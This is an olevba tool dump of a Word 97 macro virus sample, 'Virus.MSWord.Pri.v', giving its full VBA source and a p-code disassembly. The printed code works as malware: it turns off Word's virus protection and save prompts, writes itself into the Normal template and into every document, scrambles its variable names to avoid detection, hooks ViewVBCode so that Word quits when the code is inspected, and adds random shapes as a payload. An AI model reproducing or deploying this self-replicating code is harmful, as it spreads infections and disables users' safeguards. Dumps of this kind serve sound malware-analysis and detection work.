olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.v
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.v - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False
If Day(Now) > Minute(Now) Then
Randomize: For BM9690 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BM9690: End If
MC239 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PI2867 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GA7183 = ActiveDocument.VBProject.VBComponents.Item(1)
BI4214 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GA7183 = NormalTemplate.VBProject.VBComponents.Item(1)
QJ6392 = True
Call BE4811_RR8122
ActiveDocument.Saved = True
End If
If QJ6392 <> True And BI4214 <> True Then GoTo DF436
If QJ6392 = True Then GA7183.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MC239 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If BI4214 = True Then GA7183.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PI2867 - 4))
DF436:
If PI2867 <> 0 And MC239 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function BE4811_RR8122()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FH2199": r1(2) = "FU21": r1(3) = "CR3095": r1(4) = "EU6751": r1(5) = "RR8122": r1(6) = "MC239"
r1(7) = "PI2867": r1(8) = "BI4214":: r1(9) = "GA7183": r1(10) = "QJ6392": r1(11) = "DF436": r1(12) = "BE4811": r1(13) = "SB6857": r1(14) = "NK2928": r1(15) = "BM9690"
For BM9690 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RR8122(a1, r1(BM9690))
Next BM9690
End Function 'VAMP v1.0 [thanks Vic!]
Private Function RR8122(NK2928, SB6857 As String)
On Error Resume Next
Dim FH2199 As Long: Dim FU21 As Long: Dim CR3095 As Long: Dim EU6751 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FH2199 = 1: FU21 = 1: CR3095 = .CountOfLines: EU6751 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SB6857, FH2199, FU21, CR3095, EU6751, True)
strline = .Lines(FH2199, 1)
strline = Left(strline, FU21 - 1) & NK2928 & Mid(strline, EU6751)
.replaceline FH2199, strline
FH2199 = CR3095 + 1: FU21 = 1:
CR3095 = .CountOfLines
EU6751 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Sub Document_C()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For LP6860 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next LP6860: End If
KQ8133 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CM9031 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = ActiveDocument.VBProject.VBComponents.Item(1)
OT7120 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = NormalTemplate.VBProject.VBComponents.Item(1)
BN320 = True
Call KD5741_KM6385
ActiveDocument.Saved = True
End If
If BN320 <> True And OT7120 <> True Then GoTo VN151
If BN320 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ8133 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OT7120 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CM9031 - 4))
VN151:
If CM9031 <> 0 And KQ8133 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KD5741_KM6385()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FD8988": r1(2) = "UP8720": r1(3) = "IG4087": r1(4) = "TL7973": r1(5) = "KM6385": r1(6) = "KQ8133"
r1(7) = "CM9031": r1(8) = "OT7120":: r1(9) = "HV823": r1(10) = "BN320": r1(11) = "VN151": r1(12) = "KD5741": r1(13) = "HD853": r1(14) = "FS9162": r1(15) = "LP6860"
For LP6860 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KM6385(a1, r1(LP6860))
Next LP6860
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KM6385(FS9162, HD853 As String)
On Error Resume Next
Dim FD8988 As Long: Dim UP8720 As Long: Dim IG4087 As Long: Dim TL7973 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FD8988 = 1: UP8720 = 1: IG4087 = .CountOfLines: TL7973 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HD853, FD8988, UP8720, IG4087, TL7973, True)
strline = .Lines(FD8988, 1)
strline = Left(strline, UP8720 - 1) & FS9162 & Mid(strline, TL7973)
.replaceline FD8988, strline
FD8988 = IG4087 + 1: UP8720 = 1:
IG4087 = .CountOfLines
TL7973 = Len(.Lines(.CountOfLines, 1))
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.v
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15418 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Gt 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld BM9690 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #5:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #7:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #8:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld BM9690 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St MC239 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PI2867 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set GA7183 
' Line #13:
' 	LitVarSpecial (True)
' 	St BI4214 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set GA7183 
' Line #17:
' 	LitVarSpecial (True)
' 	St QJ6392 
' Line #18:
' 	ArgsCall (Call) BE4811_RR8122 0x0000 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld QJ6392 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld BI4214 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo DF436 
' 	EndIf 
' Line #22:
' 	Ld QJ6392 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld MC239 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "Application.Quit SaveChanges:=wdDoNotSaveChanges"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld GA7183 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #23:
' 	Ld BI4214 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld PI2867 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld GA7183 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #24:
' 	Label DF436 
' Line #25:
' 	Ld PI2867 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld MC239 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' 	QuoteRem 0x0008 0x003F "W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]"
' Line #30:
' 	FuncDefn (Private Function BE4811_RR8122(id_FFFE As Variant))
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	ArgsCall Read 0x0000 
' Line #33:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	VarDefn r1 (As String)
' Line #34:
' 	LitStr 0x0006 "FH2199"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "FU21"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CR3095"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EU6751"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RR8122"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "MC239"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #35:
' 	LitStr 0x0006 "PI2867"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BI4214"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "GA7183"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "QJ6392"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "DF436"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BE4811"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SB6857"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "NK2928"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "BM9690"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld BM9690 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #37:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #38:
' 	Ld a1 
' 	Ld BM9690 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) RR8122 0x0002 
' Line #39:
' 	StartForVariable 
' 	Ld BM9690 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #41:
' 	FuncDefn (Private Function RR8122(NK2928, SB6857 As String, id_FFFE As Variant))
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	Dim 
' 	VarDefn FH2199 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn FU21 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn CR3095 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn EU6751 (As Long)
' Line #44:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #45:
' 	LitDI2 0x0001 
' 	St FH2199 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St FU21 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St CR3095 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St EU6751 
' Line #46:
' 	Ld SB6857 
' 	Ld FH2199 
' 	Ld FU21 
' 	Ld CR3095 
' 	Ld EU6751 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #47:
' 	Ld FH2199 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #48:
' 	Ld strline 
' 	Ld FU21 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld NK2928 
' 	Concat 
' 	Ld strline 
' 	Ld EU6751 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #49:
' 	Ld FH2199 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #50:
' 	Ld CR3095 
' 	LitDI2 0x0001 
' 	Add 
' 	St FH2199 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St FU21 
' 	BoS 0x0000 
' Line #51:
' 	MemLdWith CountOfLines 
' 	St CR3095 
' Line #52:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St EU6751 
' Line #53:
' 	Loop 
' Line #54:
' 	EndWith 
' Line #55:
' 	EndFunc 
' Line #56:
' Line #57:
' 	FuncDefn (Private Sub Document_C())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #60:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld LP6860 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #62:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #63:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #64:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #65:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld LP6860 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St KQ8133 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CM9031 
' Line #68:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set HV823 
' Line #70:
' 	LitVarSpecial (True)
' 	St OT7120 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #73:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set HV823 
' Line #74:
' 	LitVarSpecial (True)
' 	St BN320 
' Line #75:
' 	ArgsCall (Call) KD5741_KM6385 0x0000 
' Line #76:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld BN320 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld OT7120 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo VN151 
' 	EndIf 
' Line #79:
' 	Ld BN320 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld KQ8133 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "Application.Quit SaveChanges:=wdDoNotSaveChanges"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld HV823 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #80:
' 	Ld OT7120 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld CM9031 
' 	LitDI2 0x0004 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld HV823 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #81:
' 	Label VN151 
' Line #82:
' 	Ld CM9031 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld KQ8133 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #84:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #86:
' 	EndSub 
' 	QuoteRem 0x0008 0x003F "W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]"
' Line #87:
' 	FuncDefn (Private Function KD5741_KM6385(id_FFFE As Variant))
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	ArgsCall Read 0x0000 
' Line #90:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	VarDefn r1 (As String)
' Line #91:
' 	LitStr 0x0006 "FD8988"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "UP8720"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IG4087"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "TL7973"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KM6385"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KQ8133"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #92:
